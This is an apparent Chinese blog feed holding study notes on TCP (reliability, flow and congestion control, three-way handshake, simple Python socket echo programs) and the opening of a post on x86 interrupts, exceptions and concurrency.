<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/28.png" alt="pic"></p>
</li>
</ul>
</li>
<li><p><strong>4比特的首部长度（Header length）</strong>：TCP首部的长度，以4字节为单位。</p>
</li>
<li><p><strong>8比特位的标志字段</strong>：</p>
<ul>
<li><code>URG</code>：紧急数据标志位</li>
<li><code>ACK</code>：确认标志位</li>
<li><code>PSH</code>：请求推送位，接收端应尽快把数据传送给应用层</li>
<li><code>RST</code>：连接复位，通常，如果TCP收到的一个分段明显不属于该主机的任何一个连接，则向远程发送一个复位包</li>
<li><code>SYN</code>：建立连接时使用</li>
<li><code>FIN</code>：释放连接时使用</li>
</ul>
</li>
<li><p><strong>接收窗口（Recieve window）</strong>：用于流量控制。</p>
</li>
<li><p><strong>检验和（Internet checksum）</strong>：与UDP检验和字段一样。</p>
</li>
<li><p><strong>紧急数据指针（Urgent data pointer）</strong>：只有当紧急标志置位时URG，该16位的字段才有效。</p>
</li>
<li><p><strong>可选与变长的选项字段（Options）</strong></p>
</li>
<li><p><strong>数据（Data）</strong></p>
</li>
</ul>
<h3 id="5-2-TCP-可靠数据传输"><a href="#5-2-TCP-可靠数据传输" class="headerlink" title="5.2. TCP 可靠数据传输"></a>5.2. TCP 可靠数据传输</h3><p>TCP在IP不可靠的尽力而为服务之上创建了一种可靠数据传输服务，<strong>TCP可靠数据传输服务 &#x3D; rdt3.0 + 流水线</strong>。</p>
<p><strong>发送方</strong>：</p>
<ul>
<li><p>上层调用其发送数据。生成具有<strong>序号</strong>的TCP报文段，并启动定时器（只有一个，如果已经启动则不需重启）。</p>
</li>
<li><p>收到一个ACK。</p>
<ul>
<li>采用<strong>累计确认</strong>的方式：收到<strong>确认号</strong>为<code>n</code>的ACK分组，表明接收方已正确接收到序号<code>n</code>之前的所有分组；</li>
<li>重启定时器。如果所有分组都已发送和确认，则停止该定时器。</li>
</ul>
</li>
<li><p>收到3个冗余ACK（冗余ACK是对已确认报文段的再次确认）。一旦收到3个冗余ACK，发送方则<strong>快速重传</strong>冗余ACK报文确认号对应的报文段。</p>
</li>
<li><p>超时事件。如果出现超时，发送方将重传<strong>第一个（序号最小）已发送但未被确认</strong>的分组（与滑动窗口不同的是：只重传一个！），并启动定时器。</p>
</li>
</ul>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/29.png" alt="pic"></p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/30.png" alt="pic"></p>
<p><strong>接收方</strong>：</p>
<ul>
<li><p>报文段按序到达。延迟的ACK，对下一个按序报文段等待500ms，如果没有到达，则发送一个ACK；如果到达，则立即<strong>发送累积ACK</strong>。</p>
</li>
<li><p>比期望序号大的报文段到达。立即发送冗余ACK，即期望序号的ACK。</p>
</li>
<li><p>中间缺失的报文段到达。立即发送ACK。</p>
</li>
</ul>
<p>TCP是回退N步还是选择重传呢？</p>
<p>TCP更类似于回退N步（滑动窗口），但不同点在于：GBN中，如果超时，则重传<strong>所有</strong>已发送但未被确认的报文段；但TCP中，超时只重传<strong>第一个</strong>已发送但未被确认的报文段。</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/31.png" alt="pic"></p>
<h3 id="5-3-TCP-流量控制"><a href="#5-3-TCP-流量控制" class="headerlink" title="5.3. TCP 流量控制"></a>5.3. TCP 流量控制</h3><p><strong>问题</strong>：如果某应用读取数据时相对缓慢，而发送方又发送得太多、太快，接收方的接受缓存就会出现溢出。</p>
<p>为此，TCP为它的应用程序提供了 <strong>流量控制（flow-control）</strong> 服务。</p>
<p>发送方维护一个 <strong>接收窗口的变量 <code>rwnd</code></strong> 来实现流程控制，该变量表示接收方还有多少可用的缓存空间。发送方已发送但未被确认报文段的<strong>总字节数</strong>，不能超过接收窗口的值。</p>
<p>接收方会将当前剩余的缓存空间，通过TCP确认报文中的<strong>接收窗口字段</strong>告诉发送方。</p>
<p><strong>新的问题</strong>：假如接收方缓存空间已满，它通过TCP确认报文告诉发送方，发送方接收窗口的变量变为0，发送方将不再发送报文段。此时，若接收方缓存出现空余，它将不能告诉发送方。</p>
<p>解决：<strong>接收窗口变量为0时，发送方将继续发送只有一个字节的报文段</strong>，如果接收方缓存开始清空，则会返回确认报文，并将接收窗口字段设为非0值。</p>
<h3 id="5-4-TCP-拥塞控制"><a href="#5-4-TCP-拥塞控制" class="headerlink" title="5.4. TCP 拥塞控制"></a>5.4. TCP 拥塞控制</h3><p>众所周知，网络是存在拥塞的。如果拥塞时，还向网络发送数据，那将加剧拥塞。这就像交通堵塞一样。</p>
<p>那么，TCP是如何进行交通管制的呢？它首先要解决<strong>三个问题</strong>：</p>
<ol>
<li>TCP发送方如何限制其发送速率？</li>
<li>TCP如何感知路径上存在拥塞的呢？</li>
<li>当感知到拥塞时，采用何种算法来改变发送速率呢？</li>
</ol>
<p>跟流量控制一样，发送方也维护着一个**拥塞窗口的变量 <code>cwnd</code>**，发送方已发送但未被确认报文段的总字节数，不能超过<code>min&#123;rwnd, cwnd&#125;</code>。</p>
<p>但在讨论拥塞控制时，我们假设接收方缓存是无限大的，即发送方的已发送但未被确认报文段的总字节数，只取决于拥塞窗口变量。</p>
<p>并且，我们需要知道网络中没有明确的拥塞状态信号，TCP通常通过隐式地感知拥塞：<strong>超时事件</strong> 和 <strong>3个冗余ACK</strong>。</p>
<p>接下来，我们将介绍广受赞誉的<strong>TCP拥塞控制算法（TCP congestion-control algorithm）</strong>，它包含3个主要部分：</p>
<ul>
<li><strong>慢启动</strong></li>
<li><strong>拥塞避免</strong></li>
<li><strong>快速恢复</strong></li>
</ul>
<p>其中，慢启动和拥塞避免最为关键。有时，也算上快速重传算法，即4个部分。</p>
<h4 id="5-4-1-慢启动（Slow-start）"><a href="#5-4-1-慢启动（Slow-start）" class="headerlink" title="5.4.1. 慢启动（Slow start）"></a>5.4.1. 慢启动（Slow start）</h4><p>思想：从一个较小值开始，逐渐增加拥塞窗口值。</p>
<p>具体：</p>
<ul>
<li>初始拥塞窗口值设置为 1~4 个MSS（最大报文段长度）；</li>
<li>每收到一个按序的确认报文后，则将拥塞窗口值增加 1 MSS：<code>cwnd = cwnd + 1MSS</code>。</li>
</ul>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/32.png" alt="pic"></p>
<p>由于每次接收到的报文数，即为拥塞窗口值&#x2F;MSS，所以，拥塞窗口值呈倍数增长，一点也不慢！</p>
<p>考虑慢启动中的3种特殊情况：</p>
<ul>
<li>当拥塞窗口值<code>cwnd</code>达到慢启动阈值<code>ssthresh</code>时，将进入<strong>拥塞避免</strong>状态；</li>
<li>当遇到超时事件时，慢启动阈值<code>ssthresh</code>将被设置为<code>cwnd/2</code>，再将拥塞窗口值<code>cwnd</code>重置为 <code>1 MSS</code>；</li>
<li>当遇到3个冗余ACK时，慢启动阈值<code>ssthresh</code>也将被设置为<code>cwnd/2</code>，但拥塞窗口值<code>cwnd</code>被设为<code>ssthresh</code>，并执行<strong>快速重传</strong>，然后进入<strong>快速恢复</strong>状态。</li>
</ul>
<h4 id="5-4-2-拥塞避免（Congestion-Avoidance）"><a href="#5-4-2-拥塞避免（Congestion-Avoidance）" class="headerlink" title="5.4.2. 拥塞避免（Congestion Avoidance）"></a>5.4.2. 拥塞避免（Congestion Avoidance）</h4><p>思想：缓慢增加拥塞窗口值。</p>
<p>具体：</p>
<ul>
<li>当每一轮发送的所有报文段，都收到确认报文时，拥塞窗口值加 1 MSS：<code>cwnd = cwnd + 1MSS</code>。</li>
</ul>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/33.png" alt="pic"></p>
<p>考虑拥塞避免中的2种特殊情况：</p>
<ul>
<li>当遇到超时事件时，慢启动阈值<code>ssthresh</code>将被设置为<code>cwnd/2</code>，拥塞窗口值<code>cwnd</code>将被重置为 <code>1 MSS</code>，并进入<strong>慢启动</strong>状态；</li>
<li>当遇到3个冗余ACK时，慢启动阈值<code>ssthresh</code>将被设置为<code>cwnd/2</code>，拥塞窗口值<code>cwnd</code>被设为<code>ssthresh</code>，并<strong>快速重传</strong>冗余ACK指定的报文段，然后进入<strong>快速恢复</strong>状态。</li>
</ul>
<h4 id="5-4-3-快速恢复（Fast-Recovery）"><a href="#5-4-3-快速恢复（Fast-Recovery）" class="headerlink" title="5.4.3. 快速恢复（Fast Recovery）"></a>5.4.3. 快速恢复（Fast Recovery）</h4><p>思想：收到3个冗余ACK说明网络并不像超时那么糟糕。</p>
<p>具体：</p>
<ul>
<li>在快速恢复状态中，也会发送报文段。</li>
<li>如果收到冗余ACK，那么拥塞窗口值增加 1 MSS：<code>cwnd = cwnd + 1MSS</code>。由于进入快速恢复状态时，已经收到 3 个冗余ACK，所以进入快速恢复状态的初始拥塞窗口值为：<code>cwnd = ssthresh + 3MSS</code>。</li>
</ul>
<p>考虑快速恢复中的2中特殊情况：</p>
<ul>
<li>当遇到超时事件时，慢启动阈值<code>ssthresh</code>将被设置为<code>cwnd/2</code>，拥塞窗口值<code>cwnd</code>将被重置为 <code>1 MSS</code>，并进入<strong>慢启动</strong>状态；</li>
<li>当遇到新的ACK时，拥塞窗口值<code>cwnd</code>被设为<code>ssthresh</code>，并进入<strong>拥塞避免</strong>状态。</li>
</ul>
<h4 id="5-4-4-总结"><a href="#5-4-4-总结" class="headerlink" title="5.4.4. 总结"></a>5.4.4. 总结</h4><p>TCP拥塞控制算法概括：<strong>加性增，乘性减</strong>。</p>
<p>状态图：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/35.png" alt="pic"></p>
<p>拥塞窗口值<code>cwnd</code>变化示例（在<code>TCP Reno</code>版本中加入了快速恢复状态）：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/34.png" alt="pic"></p>
<h3 id="5-5-TCP-三次握手与四次挥手"><a href="#5-5-TCP-三次握手与四次挥手" class="headerlink" title="5.5. TCP 三次握手与四次挥手"></a>5.5. TCP 三次握手与四次挥手</h3><p>TCP是面向连接的，那么TCP是如何建立、释放连接的呢？</p>
<h4 id="5-5-1-三次握手"><a href="#5-5-1-三次握手" class="headerlink" title="5.5.1. 三次握手"></a>5.5.1. 三次握手</h4><ul>
<li><p>第一步：客户端TCP首先向服务端TCP发送一个特殊的TCP报文段，不包含应用层数据，报文段首部的一个标志位 <code>SYN</code> 被置为 1 ，序号字段 <code>seq</code> 被置为一个随机值 <code>client_isn</code>。这个特殊报文段被称为<strong>SYN 报文段</strong>。</p>
</li>
<li><p>第二步：服务端收到 SYN 报文段后，也返回一个特殊的TCP报文段，不包含应用层数据，首部的标志位 <code>SYN</code> 被置为 1 ，确认号字段 <code>ack</code> 被置为 <code>client_isn + 1</code>，序号字段 <code>seq</code> 被置为一个随机值 <code>server_isn</code>。这个特殊报文段被称为<strong>SYNACK 报文段</strong>。</p>
</li>
<li><p>第三步：客户端收到 SYNACK 报文段后，可以返回普通的TCP报文段，可以包含应用层数据，首部的标志位 <code>SYN</code> 被置为 0 ，确认号字段 <code>ack</code> 被置为 <code>server_isn + 1</code>，序号字段 <code>seq</code> 被置为 <code>client_isn + 1</code>。</p>
</li>
</ul>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/36.png" alt="pic"></p>
<p><strong>为什么需要三次握手呢？</strong></p>
<p>TCP连接是双向的，第一次和第二次的成功能够保证服务端听得到客户端的声音，第二次和第三次的成功能够保证客户端听得到服务端的声音。这可以类比打电话：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">“喂，你听得到吗？”</span><br><span class="line">“我听得到呀，你听得到我吗？”</span><br><span class="line">“我能听到你，今天 balabala……”</span><br></pre></td></tr></table></figure>

<p><strong>为什么不是两次握手呢？</strong></p>
<p>因为，握手阶段结束后，服务端将会为新连接分配变量和缓存。如果两次握手中第二次的 SYNACK 报文段丢失，客户端接收不到确认报文段，不会发送数据，这导致服务器会白白分配变量和缓存、苦苦等待，浪费空间和时间。</p>
<p><strong>为什么不是四次握手呢？</strong></p>
<p>多余。通过第二次握手，服务端不仅可以告诉客户端自己听得到，也可以验证客户端是否听得到自己。</p>
<h4 id="5-5-2-四次挥手"><a href="#5-5-2-四次挥手" class="headerlink" title="5.5.2. 四次挥手"></a>5.5.2. 四次挥手</h4><p>天下没有不散的宴席，TCP通过四次挥手断开连接：</p>
<ul>
<li><p>客户端&#x2F;服务端发送 <strong>FIN 报文段</strong>，首部 <code>FIN</code> 字段被置为 1 ，表明自己已经发送完所有数据。</p>
</li>
<li><p>服务端&#x2F;客户端返回 ACK 报文段，表明自己知道对方已经发送完数据了。</p>
</li>
<li><p>服务端&#x2F;客户端发送 <strong>FIN 报文段</strong>，首部 <code>FIN</code> 字段被置为 1 ，表明自己已经发送完所有数据。</p>
</li>
<li><p>客户端&#x2F;服务端返回 ACK 报文段，表明自己知道对方已经发送完数据了。</p>
</li>
</ul>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/37.png" alt="pic"></p>
<p><strong>为什么四次挥手呢？</strong></p>
<p>很简单，因为TCP是全双工的，一方发送完数据，不代表另一方也发送完数据。</p>
<h2 id="6-socket-套接字编程"><a href="#6-socket-套接字编程" class="headerlink" title="6. socket 套接字编程"></a>6. socket 套接字编程</h2><ul>
<li>UDP 客户端：</li>
</ul>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">serverName = <span class="string">&#x27;localhost&#x27;</span>    <span class="comment"># 服务端地址</span></span><br><span class="line">serverPort = <span class="number">12000</span>          <span class="comment"># 服务端端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建客户端套接字。AF_INET: 使用IPv4协议， SOCK_DGRAM: 使用UDP协议</span></span><br><span class="line">clientSocket = socket(AF_INET, SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line">message = <span class="built_in">input</span>(<span class="string">&#x27;Input lowercase sentence: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 向服务端发送消息。UDP发送的每条消息，都必须附上服务端地址</span></span><br><span class="line">clientSocket.sendto(message.encode(), (serverName, serverPort))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收服务端的消息</span></span><br><span class="line">recvMessage, serverAddress = clientSocket.recvfrom(<span class="number">2048</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;From Server:&#x27;</span>, recvMessage.decode())</span><br><span class="line"></span><br><span class="line">clientSocket.close()</span><br></pre></td></tr></table></figure>

<ul>
<li>UDP 服务端：</li>
</ul>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">serverName = <span class="string">&#x27;localhost&#x27;</span>    <span class="comment"># 服务端地址</span></span><br><span class="line">serverPort = <span class="number">12000</span>          <span class="comment"># 服务端端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建服务端套接字。AF_INET: 使用IPv4协议，SOCK_DGRAM: 使用UDP协议</span></span><br><span class="line">serverSocket = socket(AF_INET, SOCK_DGRAM)</span><br><span class="line">serverSocket.bind((serverName, serverPort)) <span class="comment"># 将套接字绑定到之前指定的端口</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The server in ready to receive&quot;</span>)</span><br><span class="line"><span class="comment"># 服务器将一直接收UDP报文</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    message, clientAddress = serverSocket.recvfrom(<span class="number">2048</span>) <span class="comment"># 接收客户端信息，同时获得客户端地址</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;receive: &quot;</span> + <span class="built_in">str</span>(message) + <span class="string">&quot; [from&quot;</span> + <span class="built_in">str</span>(clientAddress) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">    retMessage = message.upper() <span class="comment"># 将客户端发来的字符串变为大写</span></span><br><span class="line">    serverSocket.sendto(retMessage, clientAddress)  <span class="comment"># 通过已经获得的客户端地址，将修改后的字符串发回客户端</span></span><br></pre></td></tr></table></figure>

<ul>
<li>TCP 客户端：</li>
</ul>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">serverName = <span class="string">&#x27;47.110.32.215&#x27;</span>    <span class="comment"># 服务端地址</span></span><br><span class="line">serverPort = <span class="number">8082</span>          <span class="comment"># 服务端端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建客户端套接字。AF_INET: 使用IPv4协议， SOCK_STREAM: 使用TCP协议</span></span><br><span class="line">clientSocket = socket(AF_INET, SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 向服务端发起连接</span></span><br><span class="line">clientSocket.connect((serverName, serverPort))</span><br><span class="line"></span><br><span class="line">message = <span class="built_in">input</span>(<span class="string">&#x27;Input lowercase sentence: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将信息发送到服务器</span></span><br><span class="line">clientSocket.send(message.encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从服务器接收信息</span></span><br><span class="line">recvMessage = clientSocket.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;From Server:&#x27;</span>, recvMessage.decode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭套接字</span></span><br><span class="line">clientSocket.close()</span><br></pre></td></tr></table></figure>

<ul>
<li>TCP 服务端：</li>
</ul>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">serverName = <span class="string">&#x27;localhost&#x27;</span>    <span class="comment"># 服务端地址</span></span><br><span class="line">serverPort = <span class="number">12000</span>          <span class="comment"># 服务端端口</span></span><br><span class="line"></span><br><span class="line">serverSocket = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">serverSocket.bind((serverName, serverPort))</span><br><span class="line">serverSocket.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The server is ready to receive&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 服务端接收到客户端连接请求后，为新客户创建一个特定的套接字。单线程只支持单个用户</span></span><br><span class="line">    connSocket, clientAddress = serverSocket.accept()</span><br><span class="line">    message = connSocket.recv(<span class="number">1024</span>).decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;receive: &quot;</span> + <span class="built_in">str</span>(message) + <span class="string">&quot; [from&quot;</span> + <span class="built_in">str</span>(clientAddress) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">    retMessage = message.upper()</span><br><span class="line">    connSocket.send(retMessage.encode())</span><br><span class="line">    connSocket.close()</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;press q to quit or other to continue:&#x27;</span>) == <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="7-补充"><a href="#7-补充" class="headerlink" title="7. 补充"></a>7. 补充</h2><h3 id="7-1-IP-分片-与-TCP-分段"><a href="#7-1-IP-分片-与-TCP-分段" class="headerlink" title="7.1. IP 分片 与 TCP 分段"></a>7.1. IP 分片 与 TCP 分段</h3><p>由于受链路层 <strong>MTU（Maximum Transmission Unit，最大传输单元）</strong> 的影响，网络层IP会将数据报分片传输，而这对运输层是透明的，当这些数据报的片到达目的端时有可能会失序，但是在IP首部中有足够的信息让接收端能正确组装这些数据报片。</p>
<p>尽管IP分片过程看起来透明的，但有一点让人不想使用它：即使只丢失一片数据也要重新传整个数据报。因为<strong>TCP报文段，对应于一份IP数据报（而不是一个分片）</strong>，TCP没有办法只重传数据报中的一个数据分片。</p>
<p>因此，TCP试图避免IP分片。TCP是如何避免IP分片的呢？一旦TCP数据过大，超过了MSS（MSS &#x3D; MTU - TCP&#x2F;IP首部），则<strong>在运输层就会对TCP数据进行分段</strong>，这样到了IP层的数据报，自然不会超过MTU，也就不用分片了。</p>
<p>而使用UDP很容易导致IP分片。</p>
]]></content>
      <categories>
        <category>九层之台，起于累土</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>中断、异常与并发</title>
    <url>/%E4%B8%AD%E6%96%AD%E4%B8%8E%E5%B9%B6%E5%8F%91.html</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>记得在学习《计算机系统组成原理》和阅读CSAPP时，对异常控制流(异常)、并发等内容似懂非懂、雾里看花。</p>
<p>在学习了汇编语言课程后，才总算有所领会，于是打算进行相应的归纳。</p>
<span id="more"></span>

<h2 id="1-中断"><a href="#1-中断" class="headerlink" title="1. 中断"></a>1. 中断</h2><h3 id="1-1-解释"><a href="#1-1-解释" class="headerlink" title="1.1. 解释"></a>1.1. 解释</h3><p>何为中断？书本上的一种解释如下：</p>
<blockquote>
<p>中断(interrupt)是一种使CPU挂起正在执行的程序而转去处理特殊事件的操作。</p>
</blockquote>
<p>不严谨地说，中断就是“函数”，这种“函数”可以由当前程序调用，也可以由操作系统调用，或者由硬件调用，相当于“库函数”。</p>
<p>但，<strong>中断比库函数级别更高</strong>，库函数需要引入库才能调用，而中断可以不引入任何库直接调用。</p>
<p>而且，<strong>当没有操作系统时，中断也可以调用</strong>。</p>
<p>在汇编语言中，程序可以通过<code>int n</code>调用中断，<code>n</code>是中断号。</p>
<h3 id="1-2-中断向量表-Interrupt-Vector-Table，IVT"><a href="#1-2-中断向量表-Interrupt-Vector-Table，IVT" class="headerlink" title="1.2. 中断向量表(Interrupt Vector Table，IVT)"></a>1.2. 中断向量表(Interrupt Vector Table，IVT)</h3><p>在<strong>实模式</strong>下，当程序通过<code>int n</code>调用中断时，系统是如何找到对应的中断程序并跳转的呢？</p>
<p>在内存最低端的1KB空间中，存放着一个中断向量表。其中，每个中断向量占4个字节，顺序存放在中断向量表中，比如，0号中断向量在地址<code>0*4</code>处，1号中断向量在地址<code>1*4</code>处。</p>
<h3 id="1-3-中断向量"><a href="#1-3-中断向量" class="headerlink" title="1.3. 中断向量"></a>1.3. 中断向量</h3><p>那什么是中断向量呢？</p>
<p>其实，中断向量就是中断处理程序的入口地址。4字节中，高两字节是入口地址的段值，低两字节是入口地址的偏移。</p>
<h3 id="1-4-中断处理程序"><a href="#1-4-中断处理程序" class="headerlink" title="1.4. 中断处理程序"></a>1.4. 中断处理程序</h3><p>IA-32系列CPU能支持256种类型的中断(1KB即有256个中断向量)，分别编号为0<del>255，即中断类型号，简称中断号。其中，前32个中断(0</del>31)保留给处理使用，剩余的可由用户(比如操作系统)自定义。</p>
<p>每个中断都有各自的作用，并且对应一个中断处理程序。比如，属于内部中断的0号中断，是出现除0时，执行相关操作；10号中断是显示I&#x2F;O中断，提供给用户调用。</p>
<h3 id="1-5-中断响应过程"><a href="#1-5-中断响应过程" class="headerlink" title="1.5. 中断响应过程"></a>1.5. 中断响应过程</h3><p>以<strong>实模式下的IA－32系统CPU</strong>为例，中断响应和返回过程，由硬件完成，步骤如下：</p>
<ol>
<li>根据<code>int n</code>指令取得中断号</li>
<li>将标志寄存器值<code>flags</code>压栈</li>
<li>关闭外部中断和单步中断(<code>IF</code>和<code>TF</code>标志位清0)</li>
<li>中断返回地址的段值<code>cs</code>和偏移<code>ip</code>压栈</li>
<li>根据中断号，从中断向量表中取得中断处理程序的入口地址</li>
<li>跳转至中断处理程序</li>
<li>执行中断处理程序……</li>
<li>中断返回时，从栈中恢复<code>ip</code>,<code>cs</code>,<code>flags</code></li>
</ol>
<p>可以看出，中断响应和函数调用过程十分相似。而存取寄存器(cs,ip,flags)的操作，也就是<strong>上下文切换</strong>。</p>
<h3 id="1-6-中断类型"><a href="#1-6-中断类型" class="headerlink" title="1.6. 中断类型"></a>1.6. 中断类型</h3><ul>
<li><p>内部中断：发生在CPU内部，也称软件中断。比如，0号除法出错中断，1号单步中断，用户调用<code>int n</code>指令引起的中断。</p>
</li>
<li><p>外部中断：发生在CPU外部，由硬件引起，也称硬件中断。</p>
<ul>
<li><p>可屏蔽中断：由<code>INTR</code>传给CPU，如果标志位<code>IF</code>为0，则CPU不响应。</p>
</li>
<li><p>不可屏蔽中断：由<code>NMI</code>传入，要求CPU及时处理，比如电源掉电、存储器出错等。</p>
</li>
</ul>
</li>
</ul>
<h2 id="2-异常"><a href="#2-异常" class="headerlink" title="2. 异常"></a>2. 异常</h2><h3 id="2-1-异常的由来"><a href="#2-1-异常的由来" class="headerlink" title="2.1. 异常的由来"></a>2.1. 异常的由来</h3><p>在早期的<code>Intel 8086/8088</code>微处理器中，并不区分异常和中断，统称为中断。所以，上述<strong>中断内容</strong>都是在 <strong>Intel 8086 实模式</strong>基础上的，而下述<strong>异常内容</strong>将在<strong>操作系统保护模式</strong>基础上。</p>
<p>从<code>80286</code>开始，<code>Intel</code>统一把<strong>内中断</strong>称为<strong>异常&#x2F;内部异常</strong>，而把<strong>外中断</strong>称为<strong>中断&#x2F;外部中断</strong>。</p>
<p>在CSAPP中，把外中断也纳入了异常的范畴。</p>
<p>当异常或中断发生时，正在执行的<strong>逻辑控制流</strong>被打断，CPU转而执行<strong>异常处理程序</strong>，从而引起<strong>异常控制流</strong>。</p>
<h3 id="2-2-异常的分类"><a href="#2-2-异常的分类" class="headerlink" title="2.2. 异常的分类"></a>2.2. 异常的分类</h3><ul>
<li>故障：指令执行产生的意外事件，如页故障、除法出错等。返回原程序的当前指令。</li>
<li>陷阱：“预先安排”的异常，比如，系统调用(提供用户与操作系统内核交互的接口)、断点设置等。返回原程序的下一条指令。</li>
<li>终止：执行指令时发生的严重错误，比如CPU出现问题等。不返回原程序。</li>
</ul>
<h3 id="2-3-中断描述符表-Interrupt-Descriptor-Table，IDT"><a href="#2-3-中断描述符表-Interrupt-Descriptor-Table，IDT" class="headerlink" title="2.3. 中断描述符表(Interrupt Descriptor Table，IDT)"></a>2.3. 中断描述符表(Interrupt Descriptor Table，IDT)</h3><p>不同于实模式，IA-32保护模式，借助<strong>中断描述符表</strong>来存储异常处理程序或中断处理程序的入口地址，并且由<code>IDTR</code>寄存器来指定IDT表的位置。</p>
<p>中断描述表与中断向量表类似，共有256个表项，每个表项是一个8字节的<strong>中断门描述符</strong>、<strong>陷阱门描述符</strong>或<strong>任务门描述符</strong>。</p>
<p>(为什么总要取一些奇奇怪怪的名字呢？故意让人看不懂吗？不懂不懂)</p>
<p><code>Linux</code>内核在系统初始化时，会设置好IDT中的每个表项。</p>
<h2 id="3-并发"><a href="#3-并发" class="headerlink" title="3. 并发"></a>3. 并发</h2><p>中断与异常有着千丝万缕的关系，但并发又跟这两者有何关系呢？</p>
<h3 id="3-1-并发的本质"><a href="#3-1-并发的本质" class="headerlink" title="3.1. 并发的本质"></a>3.1. 并发的本质</h3><p>首先，我们必须意识到，平时遇见的并发(多个进程同时运行)，本质上是快速交替运行的进程(不考虑多CPU)。</p>
<p>而在某一个时刻，只能有一个程序在CPU运行，但由于各进程快速(毫秒级)交替运行，所以我们看起来<strong>像是同时运行的</strong>。</p>
<p>究其本质，并发，是由操作系统根据一个<strong>定时器中断</strong>，每过一会儿(xx毫秒)就帮我们切换运行程序，从而营造出来的<strong>假象</strong>。</p>
